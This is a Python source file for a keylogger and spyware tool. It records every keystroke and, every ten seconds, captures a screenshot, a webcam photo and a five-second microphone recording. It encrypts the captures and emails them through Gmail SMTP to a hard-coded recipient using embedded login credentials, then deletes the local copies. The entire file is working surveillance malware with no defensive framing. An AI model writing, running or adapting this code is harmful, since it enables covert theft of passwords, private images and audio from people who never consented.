import os
import logging
import smtplib
from datetime import datetime
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
from PIL import ImageGrab
import cv2
import pyaudio
import wave
import time
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Generate a key for encryption (you should store it securely for future decryption)
key = Fernet.generate_key()  # Replace with your actual key if you're storing it securely
cipher_suite = Fernet(key)

log_dir = ""
log_filename = f"{log_dir}keylogs_{datetime.now().strftime('%Y-%m-%d')}.txt"

# Configure logging
logging.basicConfig(filename=log_filename, 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')

# Create folders for storing files
screenshots_folder = "screenshots"
webcam_folder = "webcam"
audio_folder = "audio"

# Ensure the directories exist
os.makedirs(screenshots_folder, exist_ok=True)
os.makedirs(webcam_folder, exist_ok=True)
os.makedirs(audio_folder, exist_ok=True)

# Function to take screenshot
def capture_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_filename = f"{screenshots_folder}/screenshot_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
    screenshot.save(screenshot_filename)
    return screenshot_filename

# Function to capture webcam image
def capture_webcam():
    webcam = cv2.VideoCapture(0)
    ret, frame = webcam.read()
    webcam_filename = f"{webcam_folder}/webcam_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.jpg"
    cv2.imwrite(webcam_filename, frame)
    webcam.release()
    return webcam_filename

# Function to record audio
def capture_audio():
    audio_filename = f"{audio_folder}/audio_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.wav"
    p = pyaudio.PyAudio()

    stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
    frames = []

    print("Recording audio...")
    for _ in range(0, int(44100 / 1024 * 5)):  # Record for 5 seconds
        data = stream.read(1024)
        frames.append(data)

    print("Audio recording finished.")
    stream.stop_stream()
    stream.close()
    p.terminate()

    # Save audio as .wav
    with wave.open(audio_filename, 'wb') as wf:
        wf.setnchannels(1)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(frames))

    return audio_filename

# Function to encrypt files
def encrypt_file(file_path):
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = cipher_suite.encrypt(file_data)
    
    encrypted_file_path = f"{file_path}.enc"
    with open(encrypted_file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)
    
    return encrypted_file_path

# Function to decrypt files
def decrypt_file(file_path):
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
        
    decrypted_data = cipher_suite.decrypt(encrypted_data)
    
    decrypted_file_path = file_path.replace('.enc', '')  # Removing the .enc extension
    with open(decrypted_file_path, 'wb') as decrypted_file:
        decrypted_file.write(decrypted_data)
    
    print(f"Decrypted file saved as: {decrypted_file_path}")
    return decrypted_file_path

# Function to send email with attachments
def send_email(attachments):
    fromaddr = "keyloggerfy@gmail.com"  # Replace with your email
    toaddr = "yaroyaro012345@gmail.com"  # Replace with recipient's email
    app_password = "123Keylogger?"  # Use your Gmail App Password

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Keylogger Files"

    # Attach the files to the email
    for file in attachments:
        part = MIMEBase('application', 'octet-stream')
        with open(file, "rb") as attachment:
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename={os.path.basename(file)}")
        msg.attach(part)

    # Send the email with the attachments
    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(fromaddr, app_password)  # Login using App Password
            text = msg.as_string()
            server.sendmail(fromaddr, toaddr, text)
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Flag to control when to stop the loop
running = True

# Function to handle keypress and capture data
def on_press(key):
    global running
    try:
        if hasattr(key, 'char') and key.char is not None:
            logging.info(f"Key pressed: {key.char}")
        else:
            logging.info(f"Special key pressed: {str(key)}")
    except AttributeError:
        logging.error("Error logging the key.")
    
    # If the Escape key is pressed, stop the listener
    if key == Key.esc:
        logging.info("Escape key pressed. Exiting...")
        running = False
        return False  # Stop listener

# Main loop to capture data every 10 seconds
with Listener(on_press=on_press) as listener:
    while running:
        # Capture screenshot, webcam, and audio every 10 seconds
        screenshot_file = capture_screenshot()
        webcam_file = capture_webcam()
        audio_file = capture_audio()

        # Encrypt the captured files
        encrypted_screenshot = encrypt_file(screenshot_file)
        encrypted_webcam = encrypt_file(webcam_file)
        encrypted_audio = encrypt_file(audio_file)
        encrypted_log = encrypt_file(log_filename)  # Encrypt the log file as well

        # Send encrypted files via email, including the encrypted log file
        send_email([encrypted_screenshot, encrypted_webcam, encrypted_audio, encrypted_log])

        # Clean up (remove original and encrypted files after sending email)
        os.remove(screenshot_file)
        os.remove(webcam_file)
        os.remove(audio_file)
        os.remove(encrypted_screenshot)
        os.remove(encrypted_webcam)
        os.remove(encrypted_audio)
        os.remove(encrypted_log)

        # Wait for 10 seconds before next capture
        time.sleep(10)

    listener.join()  # Ensure the listener joins after finishing the loop
